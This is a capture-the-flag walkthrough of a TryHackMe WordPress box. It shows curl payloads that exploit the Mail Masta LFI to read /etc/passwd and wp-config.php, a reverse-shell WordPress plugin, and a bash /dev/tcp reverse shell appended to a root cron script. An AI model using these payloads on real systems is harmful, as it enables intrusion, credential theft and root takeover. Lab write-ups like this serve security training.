---

Name: All in One
Difficulty: Easy
URL: https://tryhackme.com/room/allinonemj
Description: This is a fun box where you will get to exploit the system in several ways. Few intended and unintended paths to getting user and root access.

---

# Port Scan

I started with a full TCP port scan using RustScan and Nmap:

```bash
rustscan -a all.thm -r 1-65535 --ulimit 5000 -- -sC -sV
```

Relevant results:

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.41
```

## FTP — Port 21

Anonymous FTP access is enabled:

```text
ftp-anon: Anonymous FTP login allowed
```

I connected anonymously and checked for files, but there was nothing useful.

I also tested whether I could upload a file:

```text
ftp> put test.txt
local: test.txt remote: test.txt
227 Entering Passive Mode (10.112.177.28,189,125).
553 Could not create file.
```

The FTP server therefore didn't immediately provide a useful attack path.

## SSH — Port 22

SSH is available, but I didn't have valid credentials yet.

I kept this in mind for later.

## HTTP — Port 80

The web server initially showed the default Apache page, so I moved on to directory enumeration.

---

# Directory Enumeration

I used Gobuster with several common file extensions:

```bash
gobuster dir -u http://all.thm/ \
    -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt \
    -t 100 \
    -x txt,php,html,bak,zip,log,old,js \
    -k
```

The important result was:

```text
/wordpress            (Status: 301)
```

Browsing to `/wordpress/` revealed that the application was running WordPress.

At this point, WordPress-specific enumeration made sense.

---

# WPScan

I ran WPScan to enumerate users, plugins and themes:

```bash
wpscan --url http://all.thm/wordpress \
    --enumerate u,vp,vt \
    --api-token REDACTED \
    --disable-tls-checks
```

WPScan discovered the user:

```text
[+] elyana
```

More importantly, it identified the **Mail Masta** plugin:

```text
[+] mail-masta
 | Location: http://all.thm/wordpress/wp-content/plugins/mail-masta/
 | Latest Version: 1.0
 | [!] Directory listing is enabled
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Mail Masta <= 1.0 - Unauthenticated Local File Inclusion (LFI)
 |
 | [!] Mail Masta 1.0 - Multiple SQL Injection
```

The LFI looked like the most straightforward starting point.

---

# Local File Inclusion

The vulnerability is documented as:

* CVE-2016-10956
* Mail Masta <= 1.0 — Unauthenticated LFI

The vulnerable endpoint is:

```text
/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php
```

The vulnerable parameter is `pl`.

I tested the LFI by attempting to read `/etc/passwd`:

```bash
curl 'http://all.thm/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd'
```

This worked and returned the contents of `/etc/passwd`:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
elyana:x:1000:1000:Elyana:/home/elyana:/bin/bash
...
```

This confirmed that I had arbitrary local file read.

I could also use the LFI to read files from the WordPress installation. For example:

```bash
curl 'http://all.thm/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/www/html/wordpress/wp-login.php'
```

---

# Reading `wp-config.php`

Directly requesting `wp-config.php` didn't return its source:

```bash
curl 'http://all.thm/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/www/html/wordpress/wp-config.php'
```

This happens because `wp-config.php` is PHP code. When the LFI includes it, PHP executes the file rather than displaying its source.

To read the source, I used PHP's `php://filter` stream wrapper.

```bash
curl 'http://all.thm/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php'
```

This returned base64-encoded PHP source.

After decoding it, the important section was:

```php
/** MySQL database username */
define( 'DB_USER', 'elyana' );

/** MySQL database password */
define( 'DB_PASSWORD', 'H@ckme@123' );
```

The database credentials also worked as credentials for the WordPress account.

---

# Getting a Web Shell

With access to the WordPress administrator panel, I initially tried to modify the theme's `index.php` through the Theme Editor:

```text
http://all.thm/wordpress/wp-admin/theme-editor.php?file=index.php&theme=twentytwenty
```

I replaced the PHP code with a reverse shell generated using revshells.com.

However, WordPress rejected the modification:

```text
Unable to communicate back with site to check for fatal errors,
so the PHP change was reverted. You will need to upload your PHP
file change by some other means, such as by using SFTP.
```

The problem is that WordPress performs a fatal-error check after modifying PHP files. A reverse shell doesn't behave like a normal page request, so the modification was reverted.

Instead, I used a malicious plugin.

---

# Malicious WordPress Plugin

I created a simple plugin:

```bash
mkdir all-plugin
cd all-plugin
```

Then created `all-plugin.php`:

```php
<?php
/*
Plugin Name: All In One
Description: Custom plugin
Version: 1.0
*/

/*
REST OF THE REVERSE SHELL
*/
```

I then packaged the plugin:

```bash
zip -r all-plugin.zip all-plugin/
```

The resulting ZIP could be uploaded through the WordPress plugin interface.

After uploading and activating the plugin, the reverse shell connected back to my machine.

I confirmed the shell:

```bash
id
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

I now had code execution as `www-data`.

---

# User Enumeration

I checked `/home/elyana`:

```bash
cd /home/elyana
ls -la
```

There was an interesting file:

```bash
cat hint.txt
```

```text
Elyana's user password is hidden in the system. Find it ;)
```

The WordPress password:

```text
H@ckme@123
```

did not work as Elyana's system password.

There was also an interesting file in `/var/www/html`:

```bash
cat /var/www/html/hackathons
```

```html
<html>
<body>

<h1>Damn how much I hate the smell of <i>Vinegar </i> :/ !!!  </h1>

<!-- Dvc W@iyur@123 -->
<!-- KeepGoing -->
</body>
</html>
```

The comment contained another possible password:

```text
Dvc W@iyur@123
```

However, rather than spending more time guessing credentials, I continued enumerating the system.

---

# Privilege Escalation

I checked the system-wide crontab:

```bash
cat /etc/crontab
```

The important entry was:

```text
*  *    * * *   root    /var/backups/script.sh
```

This means `/var/backups/script.sh` is executed **every minute as root**.

I checked its permissions:

```bash
ls -l /var/backups/script.sh
```

```text
-rwxrwxrwx 1 root root 73 Oct 7 2020 /var/backups/script.sh
```

The permissions are:

```text
rwxrwxrwx
```

so `www-data` can modify the script.

The script itself contained only:

```bash
#!/bin/bash

#Just a test script, might use it later to for a cron task
```

---

# Root Shell

I appended a reverse shell to the script:

```bash
echo 'bash -i >& /dev/tcp/192.168.130.165/1234 0>&1' >> /var/backups/script.sh
```

On my attacking machine, I started a listener:

```bash
nc -lvnp 1234
```

After the cron job executed, I received a shell as root.

Confirming with:

```bash
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

I could now read:

```text
/root/root.txt
```

and, as root, also access:

```text
/home/elyana/user.txt
```

---

# Alternative User Password Path

The room also provides a more conventional path to discovering Elyana's password.

Rather than relying on the cron privilege escalation, we can search for files owned by `elyana`:

```bash
find / -user elyana 2>/dev/null
```

Among the results was:

```text
/etc/mysql/conf.d/private.txt
```

Reading it:

```bash
cat /etc/mysql/conf.d/private.txt
```

reveals the hidden credential for Elyana.
